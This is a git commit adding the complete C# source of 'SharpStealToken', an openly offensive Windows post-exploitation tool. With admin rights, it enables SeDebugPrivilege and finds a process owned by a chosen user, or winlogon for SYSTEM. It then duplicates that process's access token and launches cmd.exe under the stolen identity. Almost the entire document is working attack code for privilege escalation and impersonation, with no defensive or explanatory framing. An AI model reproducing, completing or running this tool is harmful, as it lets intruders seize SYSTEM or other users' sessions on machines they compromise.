719788fe681b58fb975d2aab2cdcec637977e3f3
g0ttfrid <yurimaia@protonmail.ch>
2025-02-19 16:55:16 -0300

    Add files via upload

---
+++ Class1.cs
@@ -0,0 +1,173 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace SharpStealToken
+{
+    public static class Class1
+    {
+        [DllImport("kernel32.dll")]
+        public static extern bool CloseHandle(IntPtr handle);
+
+        [DllImport("advapi32.dll", SetLastError = true, CharSet = CharSet.Auto)]
+        public static extern bool PrivilegeCheck(IntPtr ClientToken, ref PRIVILEGE_SET RequiredPrivileges, out bool pfResult);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out LUID lpLuid);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);
+
+        [DllImport("advapi32.dll", SetLastError = true)]
+        public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges, ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);
+
+        [DllImport("kernel32.dll", SetLastError = true)]
+        public static extern IntPtr GetCurrentProcess();
+
+        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
+        public extern static bool DuplicateTokenEx(
+            IntPtr hExistingToken,
+            TokenAccess dwDesiredAccess,
+            ref SECURITY_ATTRIBUTES lpTokenAttributes,
+            SECURITY_IMPERSONATION_LEVEL ImpersonationLevel,
+            TOKEN_TYPE TokenType,
+            out IntPtr phNewToken);
+
+        [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
+        public static extern bool CreateProcessWithTokenW(
+        IntPtr hToken,
+        UInt32 dwLogonFlags,
+        string lpApplicationName,
+        string lpCommandLine,
+        UInt32 dwCreationFlags,
+        IntPtr lpEnvironment,
+        string lpCurrentDirectory,
+        [In] ref STARTUPINFO lpStartupInfo,
+        out PROCESS_INFORMATION lpProcessInformation);
+
+        //public const uint TOKEN_ALL_ACCESS = 0xF01FF;
+        public const uint SE_PRIVILEGE_ENABLED = 0x2;
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PRIVILEGE_SET
+        {
+            public uint PrivilegeCount;
+            public uint Control;
+            public static uint PRIVILEGE_SET_ALL_NECESSARY = 1;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public LUID_AND_ATTRIBUTES[] Privilege;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID
+        {
+            public uint LowPart;
+            public int HighPart;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct LUID_AND_ATTRIBUTES
+        {
+            public LUID Luid;
+            public uint Attributes;
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct TOKEN_PRIVILEGES
+        {
+            public uint PrivilegeCount;
+            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 1)]
+            public LUID_AND_ATTRIBUTES[] Privileges;
+        }
+
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+
+        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+
+        public enum TokenAccess : uint
+        {
+            TOKEN_ASSIGN_PRIMARY = 0x0001,
+            TOKEN_DUPLICATE = 0x0002,
+            TOKEN_IMPERSONATE = 0x0004,
+            TOKEN_QUERY = 0x0008,
+            TOKEN_QUERY_SOURCE = 0x0010,
+            TOKEN_ADJUST_PRIVILEGES = 0x0020,
+            TOKEN_ADJUST_GROUPS = 0x0040,
+            TOKEN_ADJUST_DEFAULT = 0x0080,
+            TOKEN_ADJUST_SESSIONID = 0x0100,
+            TOKEN_ALL_ACCESS_P = 0x000F00FF,
+            TOKEN_ALL_ACCESS = 0x000F01FF,
+            TOKEN_READ = 0x00020008,
+            TOKEN_WRITE = 0x000200E0,
+            TOKEN_EXECUTE = 0x00020000
+        }
+
+        public enum TOKEN_TYPE
+        {
+            TokenPrimary = 1,
+            TokenImpersonation
+        }
+
+        [StructLayout(LayoutKind.Sequential)]
+        public struct SECURITY_ATTRIBUTES
+        {
+            public int nLength;
+            public IntPtr lpSecurityDescriptor;
+            public bool bInheritHandle;
+        }
+
+        public enum SECURITY_IMPERSONATION_LEVEL
+        {
+            SecurityAnonymous,
+            SecurityIdentification,
+            SecurityImpersonation,
+            SecurityDelegation
+        }
+
+        public enum DesiredAccess : uint
+        {
+            STANDARD_RIGHTS_REQUIRED = 0x000F0000,
+            STANDARD_RIGHTS_READ = 0x00020000,
+            TOKEN_ASSIGN_PRIMARY = 0x0001,
+            TOKEN_DUPLICATE = 0x0002,
+            TOKEN_IMPERSONATE = 0x0004,
+            TOKEN_QUERY = 0x0008,
+            TOKEN_QUERY_SOURCE = 0x0010,
+            TOKEN_ADJUST_PRIVILEGES = 0x0020,
+            TOKEN_ADJUST_GROUPS = 0x0040,
+            TOKEN_ADJUST_DEFAULT = 0x0080,
+            TOKEN_ADJUST_SESSIONID = 0x0100,
+            TOKEN_READ = (STANDARD_RIGHTS_READ | TOKEN_QUERY),
+            TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED | TOKEN_ASSIGN_PRIMARY |
+                TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY | TOKEN_QUERY_SOURCE |
+                TOKEN_ADJUST_PRIVILEGES | TOKEN_ADJUST_GROUPS | TOKEN_ADJUST_DEFAULT |
+                TOKEN_ADJUST_SESSIONID)
+        }
+    }
+}
---
+++ Program.cs
@@ -0,0 +1,210 @@
+﻿using System;
+using System.Diagnostics;
+using System.Security.Principal;
+using System.Management;
+using System.Runtime.InteropServices;
+using static SharpStealToken.Class1;
+
+
+namespace SharpStealToken
+{
+    public class Program
+    {
+        static bool IsRunningAsAdministrator()
+        {
+            WindowsIdentity identity = WindowsIdentity.GetCurrent();
+            WindowsPrincipal principal = new WindowsPrincipal(identity);
+            return principal.IsInRole(WindowsBuiltInRole.Administrator);
+        }
+
+        static string GetOwner(int processId)
+        {
+            string query = $"SELECT * FROM Win32_Process WHERE ProcessId = {processId}";
+            using (ManagementObjectSearcher searcher = new ManagementObjectSearcher(query))
+            using (ManagementObjectCollection results = searcher.Get())
+            {
+                foreach (ManagementObject mo in results)
+                {
+                    object[] outParameters = new object[2];
+                    mo.InvokeMethod("GetOwner", outParameters);
+                    return $"{outParameters[0]}";
+                }
+            }
+            return null;
+        }
+
+        static int GetProcessIdByUser(string userName)
+        {
+            var query = $"SELECT ProcessId FROM Win32_Process WHERE Name LIKE '%'";
+            var searcher = new ManagementObjectSearcher(query);
+
+            foreach (ManagementObject obj in searcher.Get())
+            {
+                int processId = Convert.ToInt32(obj["ProcessId"]);
+                //Process process = Process.GetProcessById(processId);
+                string owner = GetOwner(processId);
+
+                if (owner == userName)
+                {
+                    return processId;
+                }
+            }
+            return -1;
+        }
+        
+        public static bool EnableWindowsPrivilege(string privilege)
+        {
+            LUID luid;
+            if (!LookupPrivilegeValue(null, privilege, out luid))
+            {
+                Console.WriteLine("Failed to lookup privilege value.");
+                return false;
+            }
+
+            IntPtr currentProcess = GetCurrentProcess();
+            IntPtr currentToken;
+            if (!OpenProcessToken(currentProcess, (uint)TokenAccess.TOKEN_ALL_ACCESS, out currentToken))
+            {
+                Console.WriteLine("Failed to open process token.");
+                return false;
+            }
+
+            TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES
+            {
+                PrivilegeCount = 1,
+                Privileges = new LUID_AND_ATTRIBUTES[1]
+            };
+            tp.Privileges[0].Luid = luid;
+            tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+            if (!AdjustTokenPrivileges(currentToken, false, ref tp, (uint)Marshal.SizeOf(tp), IntPtr.Zero, IntPtr.Zero))
+            {
+                Console.WriteLine("Failed to adjust token privileges.");
+                return false;
+            }
+
+            PRIVILEGE_SET privs = new PRIVILEGE_SET
+            {
+                PrivilegeCount = 1,
+                Control = PRIVILEGE_SET.PRIVILEGE_SET_ALL_NECESSARY,
+                Privilege = new LUID_AND_ATTRIBUTES[1]
+            };
+            privs.Privilege[0].Luid = luid;
+            privs.Privilege[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+            bool bResult;
+            if (!PrivilegeCheck(currentToken, ref privs, out bResult))
+            {
+                Console.WriteLine("Failed to check privilege.");
+                return false;
+            }
+
+            return bResult;
+        }
+
+        static void StealToken(int processId)
+        {
+            var process = Process.GetProcessById(processId);
+
+            var hToken = IntPtr.Zero;
+            var hTokenDup = IntPtr.Zero;
+            var sa = new SECURITY_ATTRIBUTES();
+            var si = new STARTUPINFO();
+            string cmd = @"C:\Windows\System32\cmd.exe";
+
+            try
+            {
+
+            // open handle to token
+            if (!OpenProcessToken(process.Handle, (uint)DesiredAccess.TOKEN_DUPLICATE | (uint)DesiredAccess.TOKEN_ASSIGN_PRIMARY | (uint)DesiredAccess.TOKEN_QUERY, out hToken))
+            {
+                Console.Error.WriteLine($"+ failed to open process token: {Marshal.GetLastWin32Error()}");
+                return;
+            }
+            
+            // duplicate token
+            if (!DuplicateTokenEx(hToken, TokenAccess.TOKEN_ALL_ACCESS, ref sa,
+                SECURITY_IMPERSONATION_LEVEL.SecurityImpersonation,
+                TOKEN_TYPE.TokenImpersonation, out hTokenDup))
+            {
+                Console.Error.WriteLine($"+ failed to duplicate token: {Marshal.GetLastWin32Error()}");
+                return;
+            }
+
+            // impersonate token
+            if (CreateProcessWithTokenW(hTokenDup, 0x00000002, null, cmd, 0x00000010, IntPtr.Zero, null, ref si, out PROCESS_INFORMATION pi))
+            {
+                var identity = new WindowsIdentity(hTokenDup);
+                Console.WriteLine($"+ successfully impersonate {identity.Name}");
+                return;
+            }
+
+            Console.Error.WriteLine($"+ failed to impersonate token: {Marshal.GetLastWin32Error()}");
+            return;
+
+            }
+            catch
+            {
+
+            }
+            finally
+            {
+                // close token handles
+                if (hToken != IntPtr.Zero) CloseHandle(hToken);
+                if (hTokenDup != IntPtr.Zero) CloseHandle(hTokenDup);
+
+                process.Dispose();
+            }
+
+            Console.Error.WriteLine($"+ unknown error: {Marshal.GetLastWin32Error()}");
+            return;
+        }
+
+        static void Main(string[] args)
+        {
+            Console.WriteLine($"        --++ R3dw0lv3s ++--");
+            Console.WriteLine($"     --++ SharpStealToken ++--\n");
+
+            if (args.Length < 1)
+            {
+                Console.WriteLine("+ use: SharpStealToken.exe \"johndoe\" or SharpStealToken.exe \"SYSTEM\"");
+                return;
+            }
+
+            if (!IsRunningAsAdministrator())
+            {
+                Console.WriteLine("+ necessary admin privs");
+                return;
+            }
+
+            Console.WriteLine($"+ current process as: {WindowsIdentity.GetCurrent().Name}");
+
+            if (!EnableWindowsPrivilege("SeDebugPrivilege"))
+            {
+                Console.WriteLine($"+ error adjusting priv {Marshal.GetLastWin32Error()}");
+                return;
+            }
+            Console.WriteLine($"+ SeDebugPrivilege enable");
+
+            string userName = args[0];
+
+            if (userName == "SYSTEM")
+            {
+                Process winLogon = Process.GetProcessesByName("winlogon")[0];
+                StealToken(winLogon.Id);
+            }
+            else
+            {
+                int processId = GetProcessIdByUser(userName);
+                if (processId != -1)
+                {
+                    Console.WriteLine($"+ processId for {userName} found: {processId}");
+
+                    StealToken(processId);
+                }
+            }
+
+
+        }
+    }
+}
